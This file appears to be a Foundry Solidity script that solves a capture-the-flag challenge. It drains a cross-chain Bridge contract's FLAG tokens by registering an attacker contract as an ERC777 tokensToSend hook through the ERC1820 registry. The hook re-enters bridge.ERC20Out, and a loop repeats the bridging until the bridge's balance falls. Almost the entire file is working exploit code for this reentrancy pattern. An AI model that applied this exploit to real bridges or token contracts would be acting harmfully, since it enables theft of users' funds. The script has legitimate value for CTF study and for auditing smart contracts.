// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Bridge, Token, BridgedERC20} from "../src/Bridge.sol";
import {IERC20, IERC20Metadata} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC777Sender} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC777/IERC777Sender.sol";
import {IERC1820Registry} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/IERC1820Registry.sol";

import {ERC1820Implementer} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/ERC1820Implementer.sol";

contract BridgeSolve is Script {
    Bridge public bridge = Bridge(payable(0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba));
    Bridge public remoteBridge;
    Token public flagToken;
    
    address public relayer;
    address public player;
    uint256 public CHAIN_ID = 1;
    uint256 public REMOTE_CHAIN_ID = 2;
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");


    // // Deploy
    // function setUp() public {
    //     player = vm.envAddress("PLAYER");
    //     relayer = address(0x1);
    //     address[] memory a = new address[](0);
    //     flagToken = new Token(player, a);
    //     CHAIN_ID = 1;
    //     bridge = new Bridge(relayer, address(flagToken), CHAIN_ID);
    //     REMOTE_CHAIN_ID = 2;
    //     remoteBridge = new Bridge(relayer, address(0x02), REMOTE_CHAIN_ID);
    //     vm.prank(relayer);
    //     bridge.registerRemoteBridge(REMOTE_CHAIN_ID, address(remoteBridge));
    // }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        player = vm.envAddress("PLAYER");
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("Bridge: ", address(bridge));
        // console.log("Bridge balance: ", address(bridge).balance);
        flagToken = Token(bridge.FLAG_TOKEN());
        // relayer = bridge.relayer();
        console.log("FLAG_TOKEN: ", address(flagToken));
        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
        console.log("SOURCE CHAIN_ID : ", CHAIN_ID);
        // console.log("isSolved(): ", bridge.isSolved());
        console.log("Total Default operators of FLAG : ", flagToken.defaultOperators().length); // NO operators
        // console.log("Relayer: ", relayer);
        remoteBridge = Bridge(payable(bridge.remoteBridge(REMOTE_CHAIN_ID)));
        console.log("REMOTE CHAIN_ID : ", REMOTE_CHAIN_ID);
        console.log("REMOTE Bridge: ", address(remoteBridge));
        console.log("REMOTE Bridge balance: ", address(remoteBridge).balance);
        Attack attack = new Attack(address(bridge), /*address(bridgedToken)*/ address(flagToken), player);
        console.log("Attack : ", address(attack));
       _ERC1820_REGISTRY.setInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH, address(attack));
        require(attack.isRegister()==address(attack), "Failed to set interface");
        flagToken.approve(address(bridge), type(uint256).max);
        address bridgedToken;
        while (flagToken.balanceOf(address(bridge)) > 89 ether) {
        // for (uint8 i; i <=1; i++){
            uint256 amount = flagToken.balanceOf(address(player))/2;
            flagToken.transfer(address(attack), amount);
            bridge.ERC20Out(address(flagToken), player, amount);
            bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
            attack.sendMeback();
            remoteBridge.ERC20Out(bridgedToken, player, BridgedERC20(bridgedToken).balanceOf(player));
        }
        bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
        console.log("REMOTE Bridge balance of FLAG : ", flagToken.balanceOf(address(remoteBridge)));
        // console.log("IS FLAG token registed at remote : ", bridge.isTokenRegisteredAtRemote(REMOTE_CHAIN_ID, address(flagToken)));
        // console.log("FLAG token to local token(BridgedERC20) : ", bridgedToken);
        console.log("Player balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(player));
        // console.log("Attack balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(address(attack)));
        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
        console.log("Attack balance of FLAG : ", flagToken.balanceOf(address(attack)));
        console.log("isSolved(): ", bridge.isSolved());
        vm.stopBroadcast();
    }
}

contract Attack is ERC1820Implementer, IERC777Sender {
    // BridgedERC20 public bridgedERC20;
    Bridge public bridge;
    address public flagToken;
    address public player;
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address _bridge, /*address _bridgedERC20,*/ address _flagToken, address _player) {
        bridge = Bridge(payable(_bridge));
        // bridgedERC20 = BridgedERC20(_bridgedERC20);
        flagToken = _flagToken;
        player = _player;
        _registerInterfaceForAddress(_TOKENS_SENDER_INTERFACE_HASH, player);
        IERC20(flagToken).approve(address(bridge), type(uint256).max);
    }
    function isRegister() public returns (address implementer){
        implementer = _ERC1820_REGISTRY.getInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH);
    }
    function sendMeback() external {
        IERC20(flagToken).transfer(player, IERC20(flagToken).balanceOf(address(this)));
    }
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if ((from == player && to == address(this)) || (from == address(bridge) && to == player)){
            return;
        }
        bridge.ERC20Out(address(flagToken), player, amount);
    }


}